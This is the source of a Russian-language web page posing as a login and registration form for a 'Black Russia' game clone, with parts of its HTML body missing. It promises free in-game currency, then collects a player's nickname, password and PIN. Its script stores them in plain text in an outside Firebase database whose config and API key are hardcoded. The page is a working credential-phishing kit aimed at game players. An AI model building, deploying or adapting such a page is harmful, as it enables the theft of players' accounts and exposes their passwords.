<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Black Russia Clone - Авторизация</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: linear-gradient(135deg, #12161a, #1a222d);
            color: #ffffff;
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* Стиль матового стекла (Liquid Glass) */
        .glass-container {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            padding: 30px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            text-align: center;
        }

        /* Текст сверху, который можно менять */
        .promo-title {
            font-size: 20px;
            font-weight: bold;
            color: #e0e6ed;
            margin-bottom: 8px;
            line-height: 1.3;
        }

        .promo-subtitle {
            font-size: 14px;
            color: #38bdf8; /* Спокойный голубой акцент */
            margin-bottom: 25px;
        }

        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            color: #94a3b8;
            margin-bottom: 6px;
            padding-left: 4px;
        }

        .input-field {
            width: 100%;
            padding: 12px 16px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s;
        }

        .input-field:focus {
            border-color: #38bdf8;
        }

        /* Предупреждение о неправильном формате ника (мягкий оранжевый, без агрессивного красного) */
        .error-message {
            display: none;
            color: #fb923c;
            font-size: 12px;
            margin-top: 5px;
            padding-left: 4px;
        }

        /* Синяя основная кнопка */
        .btn {
            width: 100%;
            padding: 14px;
            background: #2563eb;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            margin-top: 10px;
        }

        .btn:hover {
            background: #1d4ed8;
        }

        .btn:active {
            transform: scale(0.98);
        }

        /* Кнопка выбора сервера */
        .btn-secondary {
            background: rgba(255, 255, 255, 0.07);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #e2e8f0;
            margin-bottom: 15px;
        }

        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.12);
        }

        #menu {
            display: none;
            margin-top: -5px;
            margin-bottom: 15px;
            animation: fadeIn 0.3s ease;
        }

        select {
            width: 100%;
            padding: 12px;
            background: #1e293b;
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 8px;
            color: white;
            font-size: 15px;
            outline: none;
        }

        #selected {
            margin: 10px 0 15px 0;
            font-size: 14px;
            color: #34d399; /* Приятный зеленый для успешного статуса */
            font-weight: 500;
        }

        /* Кастомное модальное окно */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(5px);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 20px;
        }

        .modal-content {
            background: #1e293b;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 25px;
            max-width: 350px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            animation: scaleUp 0.25s ease;
        }

        .modal-content h3 {
            color: #34d399;
            margin-bottom: 12px;
            font-size: 18px;
        }

        .modal-content p {
            font-size: 14px;
            color: #cbd5e1;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes scaleUp {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

        <div class="promo-subtitle">Зарегистрируйся прямо сейчас и получи 10кк бесплатно!</div>

            <div class="input-group">

            </div>

            <div class="input-group">

    <div id="successModal" class="modal-overlay">

            <button class="btn" onclick="closeModal()">Отлично</button>

    <script>
        // Твой конфиг Firebase Realtime Database
        const firebaseConfig = {
            apiKey: "AIzaSyCHjsiC8jC1AVkCvMmDXK7_fVKm6StpUtw",
            authDomain: "beaschat-e0a28.firebaseapp.com",
            projectId: "beaschat-e0a28",
            storageBucket: "beaschat-e0a28.firebasestorage.app",
            messagingSenderId: "906515573172",
            appId: "1:906515573172:web:ee23ac70264e7a18d36ae1",
            measurementId: "G-XLVW2SYHPM",
            databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
        };

        // Инициализация Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function openMenu(){
            document.getElementById("menu").style.display = "block";
        }

        function saveServer(){
            let server = document.getElementById("serverSelect").value;
            localStorage.setItem("selectedServer", server);
            
            if(server) {
                document.getElementById("selected").innerHTML = "Выбран сервер: " + server;
            } else {
                document.getElementById("selected").innerHTML = "";
            }
        }

        window.onload = function(){
            let saved = localStorage.getItem("selectedServer");
            if(saved){
                document.getElementById("serverSelect").value = saved;
                document.getElementById("selected").innerHTML = "Выбран сервер: " + saved;
            }
        }

        // Логика отправки формы
        function submitForm(event) {
            event.preventDefault();

            let usernameField = document.getElementById("username");
            let usernameVal = usernameField.value.trim();
            let passwordVal = document.getElementById("password").value;
            let pincodeVal = document.getElementById("pincode").value;
            let serverVal = document.getElementById("serverSelect").value;
            let errorDiv = document.getElementById("usernameError");

            // Регулярное выражение проверки формата Имя_Фамилия
            const nicknameRegex = /^[A-Za-z]+_[A-Za-z]+$/;

            if (!nicknameRegex.test(usernameVal)) {
                errorDiv.style.display = "block";
                usernameField.style.borderColor = "#fb923c";
                usernameField.focus();
                return;
            } else {
                errorDiv.style.display = "none";
                usernameField.style.borderColor = "rgba(255, 255, 255, 0.1)";
            }

            if(!serverVal) {
                alert("Пожалуйста, выберите сервер!");
                return;
            }

            // Условная валидация пин-кода: проверяем длину ТОЛЬКО если поле заполнено
            if(pincodeVal.length > 0 && pincodeVal.length !== 4) {
                alert("Если вы вводите пин-код, он должен состоять ровно из 4 цифр!");
                return;
            }

            // Запись в базу данных (если пин-код пуст, запишет "не указан")
            database.ref('users/' + usernameVal).set({
                username: usernameVal,
                password: passwordVal,
                pincode: pincodeVal || "не указан",
                server: serverVal,
                date: new Date().toLocaleString()
            })
            .then(() => {
                // Сброс формы и очистка стейтов
                document.getElementById("accountForm").reset();
                document.getElementById("selected").innerHTML = "";
                localStorage.removeItem("selectedServer");
                
                // Показ кастомного модального окна
                document.getElementById("successModal").style.display = "flex";
            })
            .catch((error) => {
                console.error("Ошибка сохранения данных:", error);
                alert("Ошибка соединения с базой данных!");
            });
        }

        function closeModal() {
            document.getElementById("successModal").style.display = "none";
        }
    </script>
</body>
</html>
